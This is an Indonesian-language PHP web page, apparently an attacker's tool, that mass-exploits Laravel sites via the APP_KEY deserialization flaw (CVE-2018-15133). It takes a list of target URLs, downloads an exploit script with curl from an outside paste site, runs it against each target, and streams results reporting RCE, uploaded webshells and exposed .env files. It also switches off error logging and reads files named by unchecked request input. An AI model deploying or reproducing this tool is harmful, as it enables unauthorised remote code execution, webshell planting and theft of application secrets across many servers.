<html>
<head>
<title>[+] Laravel Mass APP_KEY RCE [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$memek = $_REQUEST['file'];
$kentod = file_get_contents("/tmp/tempku/".$memek."_ak.uk45");
if ($memek) {
  header("Content-Type: text/html");
  echo "<pre style='text-align: left; white-space: pre-line;'>";
  echo '<div onclick="window.stop();" style="cursor: pointer;">[ Stop Loading ]</div><hr>';
  echo $kentod;
  echo "</pre>";
  echo '<meta http-equiv="Refresh" content="3">';
  exit();
}
?>
<body bgcolor="#1e1e1e" text="white" onload="antixss()">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}
</style>
<body>
<center>
<font face=courier new size=5>Laravel Mass APP_KEY RCE<br><font size="3">Mass Laravel Dengan Menggunakan APP_KEY RCE (CVE-2018-15133)<hr>
<form method="post">
<textarea rows=1 name="url" placeholder="https://exploits.my.id" required="true"></textarea><br><br>
<input type="submit" name="go" value="Gaskan"><br>
</form>
<?php
@ini_set('max_execution_time',0);
$random = mt_rand(10000000,99999999);
$linkweb = basename($_SERVER['REQUEST_URI']);
$url = $_POST['url'];
$submit = $_POST['go'];
$meki = str_replace("\r", "", $url);
if($submit) {
  echo "<hr>";
  //echo "Check <a href='temp/".$random."_output.txt' target='_blank'><font color=yellow>Live Output Text</font></a> Here<br>";
  if (file_exists("/tmp/tempku")) {
      
  } else {
    passthru("mkdir /tmp/tempku");
  }
$file = fopen("/tmp/tempku/".$random.".txt","w");
fwrite($file, $meki);
fclose($file);
if (file_exists("/tmp/tempku/askdmcalkwmke.php")) {
} else {
  exec("curl -Ls https://ghostbin.co/paste/qufb/raw | tee -a /tmp/tempku/askdmcalkwmke.php");
}
//echo '<font size="2" style="font-family: courier; float: left; text-align: left;">';
$commandString = 'php /tmp/tempku/askdmcalkwmke.php list=/tmp/tempku/'.$random.'.txt | tee -a /tmp/tempku/'.$random.'_ak.uk45';
$exec = popen($commandString, "r");
$chek = shell_exec("grep -c '.*' /tmp/tempku/".$random.".txt");
echo "<font>Loading ... ( <font color=yellow>".$chek."</font> Sites )<br>Check Live Output <a href='".$linkweb."&file=".$random."' target='_blank'><font color=yellow>Here</font></a><hr>";
echo "<pre style='text-align: left; white-space: pre-line;'>";
while($output = fgets($exec, 4096))
{
    $gabut = str_replace("NOT VULN", "<font color=red size=2 color=#ff0000 class=area>NOT VULN <font color=yellow class=area>But .env Found</font>", $output);
    $gadap = str_replace("NO APP_KEY!!!!", "<font color=red size=2 color=#ff6a00 class=area>NO APP_KEY!!!!</font>", $gabut);
    $gadak = str_replace("Failed Upload Shell! But RCE OK!", "<font color=red size=2 color=#ff6a00 class=area>NO APP_KEY!!!!</font>", $gadap);
    $gadal = str_replace("SHELL FAIL! But RCE OK! Maybe Permission Denied For Uploading Shell!!!", "<font color=red size=2 color=yellow class=area>SHELL FAIL! But RCE OK! Maybe Permission Denied For Uploading Shell!!!</font>", $gadak);
    $gadac = str_replace("SHELL OK ===> ", "<font color=red size=2 color=greenclass=area>SHELL OK ===> </font>", $gadal);
    echo $gadac;
    ob_flush();
    flush();
}
pclose($exec);
echo "</pre>";
}
?>
</form></font>
<center><hr><font size=3>Code by : <a href="https://www.facebook.com/con7ext"><font color=orange>Con7ext</font></a><br><font size=3>Unknown45 - 2021
</body>
</html>